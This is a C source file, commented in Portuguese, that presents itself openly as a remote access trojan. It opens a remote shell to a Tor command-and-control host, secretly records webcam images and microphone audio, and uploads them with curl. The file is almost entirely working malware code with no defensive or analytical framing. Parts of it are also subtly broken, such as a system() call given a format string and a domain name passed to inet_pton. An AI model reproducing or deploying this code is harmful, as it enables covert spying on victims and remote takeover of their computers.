// ============================================================
// 3. 0x0-ABYSSRAT.c - REMOTE ACCESS TROJAN
// ============================================================
/*
 * FUNCAO: Acesso remoto total a maquina
 * CAPACIDADES: Webcam, Mic, Screen, Keylogger, Shell
 * C2: Encrypted + Tor
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <curl/curl.h>

#define C2_DOMAIN "0x0-c2.onion"
#define C2_PORT 4444
#define ENCRYPT_KEY "0x0_RAT_SECRET_KEY_2025"

void encrypt_data(char *data, int len) {
    for (int i = 0; i < len; i++) {
        data[i] ^= ENCRYPT_KEY[i % strlen(ENCRYPT_KEY)];
    }
}

void *shell_handler(void *sock) {
    int client_fd = *(int*)sock;
    char buffer[4096];
    
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        int bytes = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
        
        if (bytes <= 0) break;
        
        // Executa comando
        FILE *fp = popen(buffer, "r");
        if (fp) {
            char result[65536] = {0};
            fread(result, 1, sizeof(result) - 1, fp);
            pclose(fp);
            
            encrypt_data(result, strlen(result));
            send(client_fd, result, strlen(result), 0);
        }
    }
    return NULL;
}

void capture_webcam() {
    // Linux: captura via v4l2
    system("ffmpeg -f v4l2 -video_size 640x480 -i /dev/video0 -frames 1 /tmp/.cam.jpg 2>/dev/null");
    
    // Envia para C2
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "curl -F 'file=@/tmp/.cam.jpg' http://%s/upload", C2_DOMAIN);
    system(cmd);
}

void capture_mic() {
    // Captura audio
    system("arecord -d 10 -f cd -t wav /tmp/.mic.wav 2>/dev/null");
    system("curl -F 'file=@/tmp/.mic.wav' http://%s/upload", C2_DOMAIN);
}

void *rat_thread(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    
    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, C2_DOMAIN, &server_addr.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
            pthread_t shell_t;
            pthread_create(&shell_t, NULL, shell_handler, &sock);
            
            // Loop de comandos
            while (1) {
                // Captura webcam a cada 30 min
                sleep(1800);
                capture_webcam();
                
                // Captura audio a cada hora
                sleep(1800);
                capture_mic();
            }
        }
        
        sleep(30);
    }
    return NULL;
}

int main() {
    pthread_t rat;
    pthread_create(&rat, NULL, rat_thread, NULL);
    
    while (1) {
        sleep(60);
    }
    return 0;
}